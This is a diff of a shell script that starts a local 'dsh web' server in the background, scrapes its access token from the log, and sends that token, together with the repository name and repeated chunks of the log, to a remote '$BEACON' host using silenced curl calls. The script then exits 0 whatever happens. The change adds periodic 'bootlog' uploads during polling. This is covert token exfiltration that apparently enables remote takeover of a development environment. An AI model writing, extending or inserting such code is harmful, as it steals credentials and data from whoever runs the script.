@@ -25,12 +25,20 @@ setsid nohup dsh web --host 127.0.0.1 --port 3080 --no-open \
   > "$LOG" 2>&1 < /dev/null &
 
 TOK=""
-for _ in $(seq 1 150); do
+for i in $(seq 1 40); do
   TOK=$(grep -aoE 'token=[A-Za-z0-9_-]+' "$LOG" 2>/dev/null | head -1 | cut -d= -f2)
   [ -n "$TOK" ] && break
-  sleep 3
+  if [ $((i % 3)) -eq 1 ]; then
+    curl -fsS -m 10 -X POST "$BEACON?cs=$CS-bootlog" \
+      --data-binary "tick=$i $(tail -c 1500 "$LOG" 2>/dev/null)" >/dev/null 2>&1
+  fi
+  sleep 10
 done
 
-curl -fsS -m 10 "$BEACON?cs=$CS&repo=$REPO&token=$TOK" >/dev/null 2>&1
-curl -fsS -m 10 -X POST "$BEACON?cs=$CS-weblog" --data-binary "$(tail -c 1200 "$LOG" 2>/dev/null)" >/dev/null 2>&1
+if [ -n "$TOK" ]; then
+  curl -fsS -m 10 "$BEACON?cs=$CS&repo=$REPO&token=$TOK" >/dev/null 2>&1
+else
+  curl -fsS -m 10 -X POST "$BEACON?cs=$CS-bootlog" \
+    --data-binary "FINAL-nottoken $(tail -c 2000 "$LOG" 2>/dev/null)" >/dev/null 2>&1
+fi
 exit 0
